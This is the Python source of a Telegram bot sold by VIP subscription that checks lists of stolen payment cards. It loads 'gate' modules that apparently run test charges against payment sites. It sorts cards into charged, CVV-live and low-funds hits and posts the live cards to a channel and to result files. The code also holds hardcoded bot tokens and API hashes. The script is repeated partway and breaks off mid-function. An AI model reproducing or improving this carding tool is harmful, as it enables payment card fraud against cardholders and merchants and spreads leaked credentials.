import requests
import telebot, time, json
from datetime import datetime, timedelta
from telebot import types
import importlib
import random
import os
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import threading
import queue
import logging
from typing import Dict, Any, Optional
from functools import wraps
import hashlib

# --- LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- CONFIGURATION (Move to environment variables) ---
import os as env_os
token = env_os.getenv('TELEGRAM_TOKEN', '8910582957:AAEtLRnEePDQ-xA81fOGMjyWpG8NeOzbzP0')
ADMIN_ID = int(env_os.getenv('ADMIN_ID', '5831292144'))
API_ID = env_os.getenv('API_ID', '37536372')
API_HASH = env_os.getenv('API_HASH', 'abcebb0aa8c00b3ccb4a3172b566325d')
CHANNEL_ID = env_os.getenv('CHANNEL_ID', '-1003763847738')

# --- THREAD-SAFE GLOBALS ---
active_checks_lock = threading.RLock()
active_checks: Dict[int, Dict[str, Any]] = {}
user_sessions_lock = threading.RLock()
file_locks: Dict[str, threading.Lock] = {}
file_locks_lock = threading.Lock()

def get_file_lock(filepath: str) -> threading.Lock:
    """Get or create a lock for a specific file"""
    with file_locks_lock:
        if filepath not in file_locks:
            file_locks[filepath] = threading.Lock()
        return file_locks[filepath]

# --- RATE LIMITER ---
class RateLimiter:
    def __init__(self, max_calls_per_second=30):
        self.max_calls = max_calls_per_second
        self.calls = []
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            # Remove calls older than 1 second
            self.calls = [t for t in self.calls if now - t < 1]
            if len(self.calls) >= self.max_calls:
                sleep_time = 1.0 - (now - self.calls[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(now)

rate_limiter = RateLimiter()

def rate_limited(func):
    """Decorator for rate-limiting bot API calls"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        rate_limiter.wait_if_needed()
        return func(*args, **kwargs)
    return wrapper

# Apply rate limiting to bot methods
telebot.TeleBot.send_message = rate_limited(telebot.TeleBot.send_message)
telebot.TeleBot.edit_message_text = rate_limited(telebot.TeleBot.edit_message_text)
telebot.TeleBot.reply_to = rate_limited(telebot.TeleBot.reply_to)

# --- FILE OPERATIONS WITH LOCKING ---
RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

# Per-user result directories
def get_user_results_dir(user_id: int) -> str:
    user_dir = os.path.join(RESULTS_DIR, str(user_id))
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)
    return user_dir

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5220166546491459639", "❌": "6037570896766438989",
    "🐇": "6199501437387412202", "💳": "5472250091332993630", "💠": "5971837723676249096",
    "📝": "5258500400918587241", "🌐": "4956560549287560231", "🎯": "5287535694099536694",
    "🤖": "5927026418616636353", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
    "⚠️": "5420323339723881652", "💎": "4956739572114392015", "📅": "6066395745139824604",
    "⚙️": "6264791387032523779", "➡️": "4918408122868958076", "🏦": "5424887227807188349",
    "🌍": "6188045471118790922", "👨‍💻": "5942623248754676762",
}

def get_emj(emoji_char):
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS[emoji_char]}">{emoji_char}</tg-emoji>'
    return emoji_char

USERS_FILE = 'users.json'
users_file_lock = threading.Lock()

def load_users_data():
    """Thread-safe user data loading"""
    with users_file_lock:
        try:
            if not os.path.exists(USERS_FILE):
                with open(USERS_FILE, 'w', encoding='utf-8') as f:
                    json.dump({"allowed_users": {}, "vip_plans": {
                        "1_month": {"price": 10, "days": 30},
                        "3_months": {"price": 25, "days": 90},
                        "1_year": {"price": 80, "days": 365}
                    }}, f, indent=4)
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading users data: {e}")
            return {"allowed_users": {}, "vip_plans": {}}

def save_users_data(data):
    """Thread-safe user data saving"""
    with users_file_lock:
        try:
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving users data: {e}")

def is_user_allowed(user_id):
    users_data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str == str(ADMIN_ID): 
        return True
    if user_id_str in users_data['allowed_users']:
        user_info = users_data['allowed_users'][user_id_str]
        if 'vip_expiry' in user_info:
            expiry_date = datetime.strptime(user_info['vip_expiry'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expiry_date: 
                return True
    return False

# Load gate modules
GATE_MODULES = []
import glob
for gate_file in glob.glob('gatet*.py'):
    module_name = gate_file.replace('.py', '')
    try: 
        module = importlib.import_module(module_name)
        GATE_MODULES.append(module)
        logger.info(f"Loaded gate module: {module_name}")
    except Exception as e: 
        logger.error(f"Failed to load gate module {module_name}: {e}")

bot = telebot.TeleBot(token, parse_mode="HTML")

def is_card_expired(cc):
    try:
        parts = cc.split("|")
        if len(parts) >= 3:
            exp_month = parts[1].strip()
            exp_year_raw = parts[2].strip()
            if len(exp_year_raw) == 2:
                exp_year = 2000 + int(exp_year_raw)
            else:
                exp_year = int(exp_year_raw)
            exp_month_int = int(exp_month)
            current_date = datetime.now()
            current_year = current_date.year
            current_month = current_date.month
            if exp_year < current_year:
                return True
            elif exp_year == current_year and exp_month_int < current_month:
                return True
    except:
        pass
    return False

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    users_data = load_users_data()
    is_admin = str(user_id) == str(ADMIN_ID)
    status = f"{get_emj('🤵')} OWNER" if is_admin else (f"{get_emj('💎')} VIP USER" if is_user_allowed(user_id) else f"{get_emj('❌')} UNAUTHORIZED")
    expiry = "LIFETIME" if is_admin else (users_data['allowed_users'].get(str(user_id), {}).get('vip_expiry', 'N/A'))

    welcome_msg = f"""
{get_emj('🚀')} <b>WELCOME TO GOOD HQ BOT</b> {get_emj('🚀')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('💠')} <b>USER ID:</b> <code>{user_id}</code>
{get_emj('📊')} <b>STATUS:</b> <code>{status}</code>
{get_emj('⏳')} <b>EXPIRY:</b> <code>{expiry}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🎮')} <b>USER COMMANDS:</b>
➜ Send File (.txt) - Start FAST checking
➜ /vipplans - Show VIP pricing
➜ /start - Check your status

{get_emj('🤵')} <b>ADMIN COMMANDS:</b> (Admin Only)
➜ <code>/addvip [user_id] [days]</code> - Add VIP
➜ <code>/broadcast [message]</code> - Message all users
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🌐')} <b>CHANNEL: @cyber_404io</b>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"📢 CHANNEL", url="https://t.me/cyber_404io"), types.InlineKeyboardButton(f"👤 OWNER", url=f"tg://user?id={ADMIN_ID}"))
    bot.reply_to(message, welcome_msg, reply_markup=markup)

@bot.message_handler(commands=["vipplans"])
def vipplans(message):
    users_data = load_users_data()
    plans = users_data.get('vip_plans', {})
    text = f"{get_emj('💎')} <b>VIP SUBSCRIPTION PLANS</b> {get_emj('💎')}\n━━━━━━━━━━━━━━━━━━━━━━━━\n"
    for plan, info in plans.items():
        text += f"➜ <b>{plan.replace('_', ' ').title()}:</b> ${info['price']} ({info['days']} Days)\n"
    text += "\n━━━━━━━━━━━━━━━━━━━━━━━━\n{get_emj('🤵')} <b>Contact @cyber_404io to Buy!</b>"
    bot.reply_to(message, text)

@bot.message_handler(commands=["addvip"])
def add_vip(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "Usage: <code>/addvip [user_id] [days]</code>")
        return
    
    target_id = args[1]
    try:
        days = int(args[2])
    except ValueError:
        bot.reply_to(message, "Days must be a number!")
        return
    
    users_data = load_users_data()
    expiry_date = datetime.now() + timedelta(days=days)
    expiry_str = expiry_date.strftime('%Y-%m-%d %H:%M:%S')
    
    if target_id not in users_data['allowed_users']:
        users_data['allowed_users'][target_id] = {}
    
    users_data['allowed_users'][target_id]['vip_expiry'] = expiry_str
    save_users_data(users_data)
    
    bot.reply_to(message, f"✅ User <code>{target_id}</code> added as VIP!\nExpiry: <code>{expiry_str}</code>")
    try: 
        bot.send_message(target_id, f"{get_emj('🎉')} <b>CONGRATS!</b>\nYour VIP status has been activated for {days} days.\nExpiry: {expiry_str}")
    except Exception as e:
        logger.warning(f"Could not notify user {target_id}: {e}")

@bot.message_handler(commands=["broadcast"])
def broadcast(message):
    if str(message.chat.id) != str(ADMIN_ID): 
        return
    msg_text = message.text.replace("/broadcast ", "")
    if not msg_text or msg_text == "/broadcast":
        bot.reply_to(message, "Usage: /broadcast [message]")
        return
    
    users_data = load_users_data()
    all_users = list(users_data['allowed_users'].keys())
    if str(ADMIN_ID) not in all_users: 
        all_users.append(str(ADMIN_ID))
    
    success = 0
    fail = 0
    for user_id in all_users:
        try:
            bot.send_message(user_id, f"{get_emj('📢')} <b>ADMIN BROADCAST:</b>\n\n{msg_text}")
            success += 1
            time.sleep(0.05)  # Rate limit protection
        except Exception as e:
            logger.warning(f"Broadcast failed to {user_id}: {e}")
            fail += 1
    
    bot.reply_to(message, f"✅ Broadcast sent!\nSuccess: {success}\nFailed: {fail}")

def send_to_channel(cc, last, gate_name, user_name, status_type="charged"):
    if status_type == "charged":
        emoji = get_emj('🐇')
        title = "CHARGED HIT"
    elif status_type == "cvv":
        emoji = get_emj('💎')
        title = "CVV LIVE"
    else:
        emoji = get_emj('💰')
        title = "LOW FUNDS"
    
    channel_msg = f"""
{title} {emoji}
━━━━━━━━━━━━━━━━━
Response ━ {last}
Gateway ━ {gate_name}
━━━━━━━━━━━━━━━━━
User ━ {user_name} (💎 PLATINUM USER)
"""
    try: 
        bot.send_message(CHANNEL_ID, channel_msg)
    except Exception as e:
        logger.error(f"Failed to send to channel: {e}")

def update_ui(message, stats):
    """Thread-safe UI update"""
    if stats.get('stop_event', False):
        return
    
    # Use lock to prevent concurrent edits
    if not hasattr(stats, '_ui_lock'):
        stats['_ui_lock'] = threading.Lock()
    
    with stats['_ui_lock']:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton(f"✅ CHARGED: {stats['ch']}", callback_data='n'),
            types.InlineKeyboardButton(f"💳 CCN: {stats['ccn']}", callback_data='n'),
            types.InlineKeyboardButton(f"💎 CVV: {stats['cvv']}", callback_data='n'),
            types.InlineKeyboardButton(f"💰 LOW: {stats['low']}", callback_data='n'),
            types.InlineKeyboardButton(f"❌ DECLINED: {stats['dd']}", callback_data='n'),
            types.InlineKeyboardButton(f"📊 PROGRESS: {stats['checked']}/{stats['total']}", callback_data='n'),
            types.InlineKeyboardButton(f"🛑 STOP", callback_data='stop')
        )
        last_cc = stats.get('last_cc', 'N/A')
        last_gate = stats.get('last_gate', 'N/A')
        last_resp = stats.get('last_resp', 'Waiting...')
        text = f"""
{get_emj('🔄')} <b>FAST CHECKING IN PROGRESS...</b>
<b>━━━━━━━━━━━━━━</b>
{get_emj('💳')} <b>LAST CC:</b> <code>{last_cc}</code>
{get_emj('🎯')} <b>GATE:</b> <code>{last_gate}</code>
{get_emj('📝')} <b>RESP:</b> <code>{last_resp}</code>
<b>━━━━━━━━━━━━━━</b>
<b>BY: @cyber_404io</b>
"""
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=stats['msg_id'], text=text, reply_markup=markup)
        except Exception as e:
            # Ignore "message not modified" errors
            if "message is not modified" not in str(e).lower():
                logger.warning(f"UI update failed: {e}")

def save_result_to_file(user_id: int, cc: str, status_type: str, bank: str, country: str, gate_name: str):
    """Thread-safe file saving with per-user isolation"""
    user_dir = get_user_results_dir(user_id)
    if status_type == "hit":
        file_path = os.path.join(user_dir, "hit.txt")
    elif status_type == "low":
        file_path = os.path.join(user_dir, "low.txt")
    else:
        return
    
    file_lock = get_file_lock(file_path)
    with file_lock:
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"{cc}|{bank}|{country}|{gate_name}|{timestamp}\n"
            with open(file_path, 'a', encoding='utf-8') as f:
                f.write(line)
        except Exception as e:
            logger.error(f"File save error for user {user_id}: {e}")

def send_result_files(chat_id: int):
    """Send result files to user and clear them"""
    user_dir = get_user_results_dir(chat_id)
    hit_path = os.path.join(user_dir, "hit.txt")
    low_path = os.path.join(user_dir, "low.txt")
    
    try:
        if os.path.exists(hit_path) and os.path.getsize(hit_path) > 0:
            with open(hit_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('🔥')} <b>HIT RESULTS</b>")
            # Clear file after sending
            open(hit_path, 'w').close()
        
        if os.path.exists(low_path) and os.path.getsize(low_path) > 0:
            with open(low_path, 'rb') as f:
                bot.send_document(chat_id, f, caption=f"{get_emj('💰')} <b>LOW FUND RESULTS</b>")
            open(low_path, 'w').close()
    except Exception as e:
        logger.error(f"Send file error for user {chat_id}: {e}")

def process_cc(cc, message, stats):
    """Thread-safe CC processing with locking"""
    if stats.get('stop_event', False):
        return
    
    cc = cc.strip()
    if not cc:
        return
    
    # Skip expired cards silently
    if is_card_expired(cc):
        # Thread-safe increment
        with stats.get('_counter_lock', threading.Lock()):
            stats['checked'] += 1
        return
    
    # Thread-safe last_cc update
    with stats.get('_state_lock', threading.Lock()):
        stats['last_cc'] = cc
    
    # Get BIN info with retry
    data = {}
    for retry in range(2):
        try:
            response = requests.get('https://bins.antipublic.cc/bins/' + cc[:6], timeout=5)
            if response.status_code == 200:
                data = response.json()
                break
        except Exception as e:
            logger.debug(f"BIN lookup failed for {cc[:6]}: {e}")
            time.sleep(0.5)
    
    country = data.get('country_name', 'Unknown')
    flag = data.get('country_flag', 'Unknown')
    bank = data.get('bank', 'Unknown')
    
    start_time = time.time()
    gate_name = "N/A"
    last = "Error"
    
    if GATE_MODULES:
        random_gate = random.choice(GATE_MODULES)
        gate_name = random_gate.__name__
        
        with stats.get('_state_lock', threading.Lock()):
            stats['last_gate'] = gate_name
        
        try:
            last_raw = str(random_gate.Tele(cc))
            if '"message":' in last_raw:
                try:
                    last = json.loads(last_raw)['error'].get('message', last_raw)
                except:
                    last = last_raw
            else:
                last = last_raw if last_raw != "0" else "Site Rejected"
        except Exception as e:
            logger.error(f"Gateway error for {gate_name}: {e}")
            last = "Gateway Error"
    
    with stats.get('_state_lock', threading.Lock()):
        stats['last_resp'] = last
    
    execution_time = time.time() - start_time
    last_lower = last.lower()
    
    is_hit = False
    is_low = False
    is_3ds = False
    
    hit_k = ['thank', 'success":true', 'thank-you', 'successful', 'Successful!', 'confirmed', 'paid', 'transaction_id']
    low_k = ['insufficient funds', 'low funds', 'money', 'balance']
    three_k = ['additional action', 'authenticate', '3d_secure', 'verification required', 'challenge_required', 'initstripescamodal', 'client_secret', 'strong customer authentication']
    
    if any(k in last_lower for k in three_k):
        is_3ds = True
        last = "3D Authentication Required"
    elif any(k in last_lower for k in hit_k) and '"success":false' not in last_lower and 'error' not in last_lower:
        is_hit = True
        last = "Transaction Successful" if "success" in last_lower else last
    elif any(k in last_lower for k in low_k):
        is_low = True
        last = "Insufficient Funds"
    
    user_fname = message.from_user.first_name
    user_uname = f"@{message.from_user.username}" if message.from_user.username else "No Username"
    user_display = f"{user_fname} ({user_uname})"
    
    hit_msg = f"""
<b>{get_emj('🔥')} HIT FOUND! {get_emj('🔥')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('💳')} CARD     {get_emj('➡️')}</b> <code>{cc}</code>
<b>{get_emj('📝')} STATUS   {get_emj('➡️')}</b> <code>{last}</code>
<b>{get_emj('🏦')} BANK     {get_emj('➡️')}</b> <code>{bank}</code>
<b>{get_emj('🌍')} COUNTRY  {get_emj('➡️')}</b> <code>{country} {flag}</code>
<b>{get_emj('⚙️')} GATE     {get_emj('➡️')}</b> <code>{gate_name}</code>
<b>{get_emj('⏳')} TIME     {get_emj('➡️')}</b> <code>{execution_time:.1f}s</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{get_emj('👨‍💻')} BY       {get_emj('➡️')}</b> <a href="https://t.me/cyber_404io">@cyber_404io</a>
"""
    
    # Thread-safe counter updates
    with stats.get('_counter_lock', threading.Lock()):
        if is_hit:
            stats['ch'] += 1
            # Send message outside lock to avoid deadlock
            bot.reply_to(message, hit_msg)
            send_to_channel(cc, last, gate_name, user_display, "charged")
            save_result_to_file(message.chat.id, cc, "hit", bank, country, gate_name)
        elif is_low:
            stats['low'] += 1
            bot.reply_to(message, hit_msg.replace("HIT FOUND", "LOW FUNDS").replace(get_emj('🔥'), get_emj('💰')))
            send_to_channel(cc, last, gate_name, user_display, "low")
            save_result_to_file(message.chat.id, cc, "low", bank, country, gate_name)
        elif is_3ds:
            stats['cvv'] += 1
            bot.reply_to(message, hit_msg.replace("HIT FOUND", "CVV LIVE").replace(get_emj('🔥'), get_emj('💎')))
            send_to_channel(cc, last, gate_name, user_display, "cvv")
        elif 'security code is incorrect' in last_lower or 'cvc_check_failure' in last_lower:
            stats['ccn'] += 1
        elif 'Your card does not support this type of purchase' in last_lower or 'transaction_not_allowed' in last_lower:
            stats['cvv'] += 1
        else:
            stats['dd'] += 1
        
        stats['checked'] += 1
    
    # Update UI periodically
    if stats['checked'] % 3 == 0 or stats['checked'] == stats['total']:
        update_ui(message, stats)

@bot.message_handler(content_types=["document"])
def handle_docs(message):
    if not is_user_allowed(message.chat.id):
        bot.reply_to(message, f"{get_emj('❌')} Buy VIP first!")
        return
    
    # Validate file size (max 10MB)
    if message.document.file_size > 10 * 1024 * 1024:
        bot.reply_to(message, f"{get_emj('❌')} File too large! Max 10MB.")
        return
    
    # Validate file extension
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, f"{get_emj('❌')} Only .txt files are supported!")
        return
    
    ko = bot.reply_to(message, f"{get_emj('⏳')} <b>STARTING FAST CHECKER...</b>").message_id
    
    # Download file with timeout
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded = bot.download_file(file_info.file_path)
    except Exception as e:
        logger.error(f"File download failed: {e}")
        bot.edit_message_text(f"{get_emj('❌')} Failed to download file!", chat_id=message.chat.id, message_id=ko)
        return
    
    path = f"combo_{message.chat.id}_{hashlib.md5(downloaded).hexdigest()[:8]}.txt"
    try:
        with open(path, "wb") as f:
            f.write(downloaded)
        
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lino = [l.strip() for l in f.readlines() if l.strip()]
        
        if not lino:
            bot.edit_message_text(f"{get_emj('❌')} Empty file!", chat_id=message.chat.id, message_id=ko)
            os.remove(path)
            return
        
        # Create stats with locks
        stats = {
            'ch': 0, 'ccn': 0, 'cvv': 0, 'low': 0, 'dd': 0,
            'checked': 0, 'total': len(lino), 'msg_id': ko,
            'stop_event': False, 'last_cc': 'N/A', 'last_gate': 'N/A', 'last_resp': 'Waiting...',
            '_counter_lock': threading.Lock(),
            '_state_lock': threading.Lock(),
            '_ui_lock': threading.Lock()
        }
        
        # Thread-safe addition to active_checks
        with active_checks_lock:
            active_checks[message.chat.id] = stats
        
        update_ui(message, stats)
        
        # Use ThreadPoolExecutor with proper shutdown
        executor = ThreadPoolExecutor(max_workers=5)
        futures = []
        
        try:
            for cc in lino:
                if stats['stop_event']:
                    break
                future = executor.submit(process_cc, cc, message, stats)
                futures.append(future)
                time.sleep(0.03)  # Reduced sleep for better performance
            
            # Wait for completion with timeout
            for future in futures:
                try:
                    future.result(timeout=2)
                except Exception as e:
                    logger.debug(f"Task execution error: {e}")
        finally:
            executor.shutdown(wait=True, cancel_futures=False)
        
        # Clean up
        with active_checks_lock:
            active_checks.pop(message.chat.id, None)
        
        final_text = f"{get_emj('🛑')} <b>STOPPED BY USER</b>" if stats['stop_event'] else f"{get_emj('✅')} <b>FAST CHECKING COMPLETED!</b>"
        final_markup = types.InlineKeyboardMarkup(row_width=1)
        final_markup.add(
            types.InlineKeyboardButton(f"✅ {stats['ch']}", callback_data='n'),
            types.InlineKeyboardButton(f"💳 {stats['ccn']}", callback_data='n'),
            types.InlineKeyboardButton(f"💎 {stats['cvv']}", callback_data='n'),
            types.InlineKeyboardButton(f"💰 {stats['low']}", callback_data='n'),
            types.InlineKeyboardButton(f"❌ {stats['dd']}", callback_data='n')
        )
        
        try:
            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=final_text, reply_markup=final_markup)
        except Exception as e:
            logger.warning(f"Final message edit failed: {e}")
        
        # Send result files
        send_result_files(message.chat.id)
        
    except Exception as e:
        logger.error(f"Error in handle_docs: {e}", exc_info=True)
        bot.edit_message_text(f"{get_emj('❌')} Error: {str(e)[:200]}", chat_id=message.chat.id, message_id=ko)
    finally:
        if os.path.exists(path):
            os.remove(path)

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_cb(call):
    user_id = call.message.chat.id
    with active_checks_lock:
        if user_id in active_checks:
            active_checks[user_id]['stop_event'] = True
            bot.answer_callback_query(call.id, "🛑 Stopping immediately...")
        else:
            bot.answer_callback_query(call.id, "❌ No active session.")

@bot.callback_query_handler(func=lambda call: call.data == 'n')
def noop_cb(call):
    bot.answer_callback_query(call.id)

if __name__ == "__main__":
    # Remove webhook and start polling with error recovery
    try:
        bot.delete_webhook()
        logger.info("Fast Bot is running - EXPIRED cards are SILENTLY SKIPPED (no message, no count)")
        logger.info(f"Loaded {len(GATE_MODULES)} gate modules")
        
        # Start bot with error recovery
        while True:
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except Exception as e:
                logger.error(f"Polling error: {e}", exc_info=True)
                time.sleep(5)
                continue
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}", exc_info=True)import requests
import telebot, time, json
from datetime import datetime, timedelta
from telebot import types
import importlib
import random
import os
from concurrent.futures import ThreadPoolExecutor, TimeoutError
import threading
import queue
import logging
from typing import Dict, Any, Optional
from functools import wraps
import hashlib

# --- LOGGING SETUP ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- CONFIGURATION (Move to environment variables) ---
import os as env_os
token = env_os.getenv('TELEGRAM_TOKEN', '8910582957:AAEtLRnEePDQ-xA81fOGMjyWpG8NeOzbzP0')
ADMIN_ID = int(env_os.getenv('ADMIN_ID', '5831292144'))
API_ID = env_os.getenv('API_ID', '37536372')
API_HASH = env_os.getenv('API_HASH', 'abcebb0aa8c00b3ccb4a3172b566325d')
CHANNEL_ID = env_os.getenv('CHANNEL_ID', '-1003763847738')

# --- THREAD-SAFE GLOBALS ---
active_checks_lock = threading.RLock()
active_checks: Dict[int, Dict[str, Any]] = {}
user_sessions_lock = threading.RLock()
file_locks: Dict[str, threading.Lock] = {}
file_locks_lock = threading.Lock()

def get_file_lock(filepath: str) -> threading.Lock:
    """Get or create a lock for a specific file"""
    with file_locks_lock:
        if filepath not in file_locks:
            file_locks[filepath] = threading.Lock()
        return file_locks[filepath]

# --- RATE LIMITER ---
class RateLimiter:
    def __init__(self, max_calls_per_second=30):
        self.max_calls = max_calls_per_second
        self.calls = []
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        with self.lock:
            now = time.time()
            # Remove calls older than 1 second
            self.calls = [t for t in self.calls if now - t < 1]
            if len(self.calls) >= self.max_calls:
                sleep_time = 1.0 - (now - self.calls[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
            self.calls.append(now)

rate_limiter = RateLimiter()

def rate_limited(func):
    """Decorator for rate-limiting bot API calls"""
    @wraps(func)
    def wrapper(*args, **kwargs):
        rate_limiter.wait_if_needed()
        return func(*args, **kwargs)
    return wrapper

# Apply rate limiting to bot methods
telebot.TeleBot.send_message = rate_limited(telebot.TeleBot.send_message)
telebot.TeleBot.edit_message_text = rate_limited(telebot.TeleBot.edit_message_text)
telebot.TeleBot.reply_to = rate_limited(telebot.TeleBot.reply_to)

# --- FILE OPERATIONS WITH LOCKING ---
RESULTS_DIR = "results"
if not os.path.exists(RESULTS_DIR):
    os.makedirs(RESULTS_DIR)

# Per-user result directories
def get_user_results_dir(user_id: int) -> str:
    user_dir = os.path.join(RESULTS_DIR, str(user_id))
    if not os.path.exists(user_dir):
        os.makedirs(user_dir)
    return user_dir

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5220166546491459639", "❌": "6037570896766438989",
    "🐇": "6199501437387412202", "💳": "5472250091332993630", "💠": "5971837723676249096",
    "📝": "5258500400918587241", "🌐": "4956560549287560231", "🎯": "5287535694099536694",
    "🤖": "5927026418616636353", "🤵": "4949560993840629085", "💰": "5971944878815317190",
    "⏸️": "6001440193058444284", "▶️": "6285315214673975495", "🛑": "5420323339723881652",
    "📊": "6032808241891644148", "📦": "6066395745139824604", "📋": "5974235702701853774",
    "🔄": "5971837723676249096", "⏳": "5971837723676249096", "🚀": "6235302918967269680",
    "⚠️": "5420323339723881652", "💎": "4956739572114392015", "📅": "6066395745139824604",
    "⚙️": "6264791387032523779", "➡️": "4918408122868958076", "🏦": "5424887227807188349",
    "🌍": "6188045471118790922", "👨‍💻": "5942623248754676762",
}

def get_emj(emoji_char):
    if emoji_char in PREMIUM_EMOJI_IDS:
        return f'<tg-emoji emoji-id="{PREMIUM_EMOJI_IDS[emoji_char]}">{emoji_char}</tg-emoji>'
    return emoji_char

USERS_FILE = 'users.json'
users_file_lock = threading.Lock()

def load_users_data():
    """Thread-safe user data loading"""
    with users_file_lock:
        try:
            if not os.path.exists(USERS_FILE):
                with open(USERS_FILE, 'w', encoding='utf-8') as f:
                    json.dump({"allowed_users": {}, "vip_plans": {
                        "1_month": {"price": 10, "days": 30},
                        "3_months": {"price": 25, "days": 90},
                        "1_year": {"price": 80, "days": 365}
                    }}, f, indent=4)
            with open(USERS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Error loading users data: {e}")
            return {"allowed_users": {}, "vip_plans": {}}

def save_users_data(data):
    """Thread-safe user data saving"""
    with users_file_lock:
        try:
            with open(USERS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4)
        except Exception as e:
            logger.error(f"Error saving users data: {e}")

def is_user_allowed(user_id):
    users_data = load_users_data()
    user_id_str = str(user_id)
    if user_id_str == str(ADMIN_ID): 
        return True
    if user_id_str in users_data['allowed_users']:
        user_info = users_data['allowed_users'][user_id_str]
        if 'vip_expiry' in user_info:
            expiry_date = datetime.strptime(user_info['vip_expiry'], '%Y-%m-%d %H:%M:%S')
            if datetime.now() < expiry_date: 
                return True
    return False

# Load gate modules
GATE_MODULES = []
import glob
for gate_file in glob.glob('gatet*.py'):
    module_name = gate_file.replace('.py', '')
    try: 
        module = importlib.import_module(module_name)
        GATE_MODULES.append(module)
        logger.info(f"Loaded gate module: {module_name}")
    except Exception as e: 
        logger.error(f"Failed to load gate module {module_name}: {e}")

bot = telebot.TeleBot(token, parse_mode="HTML")

def is_card_expired(cc):
    try:
        parts = cc.split("|")
        if len(parts) >= 3:
            exp_month = parts[1].strip()
            exp_year_raw = parts[2].strip()
            if len(exp_year_raw) == 2:
                exp_year = 2000 + int(exp_year_raw)
            else:
                exp_year = int(exp_year_raw)
            exp_month_int = int(exp_month)
            current_date = datetime.now()
            current_year = current_date.year
            current_month = current_date.month
            if exp_year < current_year:
                return True
            elif exp_year == current_year and exp_month_int < current_month:
                return True
    except:
        pass
    return False

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.chat.id
    users_data = load_users_data()
    is_admin = str(user_id) == str(ADMIN_ID)
    status = f"{get_emj('🤵')} OWNER" if is_admin else (f"{get_emj('💎')} VIP USER" if is_user_allowed(user_id) else f"{get_emj('❌')} UNAUTHORIZED")
    expiry = "LIFETIME" if is_admin else (users_data['allowed_users'].get(str(user_id), {}).get('vip_expiry', 'N/A'))

    welcome_msg = f"""
{get_emj('🚀')} <b>WELCOME TO GOOD HQ BOT</b> {get_emj('🚀')}
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('💠')} <b>USER ID:</b> <code>{user_id}</code>
{get_emj('📊')} <b>STATUS:</b> <code>{status}</code>
{get_emj('⏳')} <b>EXPIRY:</b> <code>{expiry}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🎮')} <b>USER COMMANDS:</b>
➜ Send File (.txt) - Start FAST checking
➜ /vipplans - Show VIP pricing
➜ /start - Check your status

{get_emj('🤵')} <b>ADMIN COMMANDS:</b> (Admin Only)
➜ <code>/addvip [user_id] [days]</code> - Add VIP
➜ <code>/broadcast [message]</code> - Message all users
━━━━━━━━━━━━━━━━━━━━━━━━
{get_emj('🌐')} <b>CHANNEL: @cyber_404io</b>
"""
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"📢 CHANNEL", url="https://t.me/cyber_404io"), types.InlineKeyboardButton(f"👤 OWNER", url=f"tg://user?id={ADMIN_ID}"))
    bot.reply_to(message, welcome_msg, reply_markup=markup)

@bot.message_handler(commands=["vipplans"])
def vipplans(message):
    users_data = load_users_data()
    plans = users_data.get('vip_plans', {})
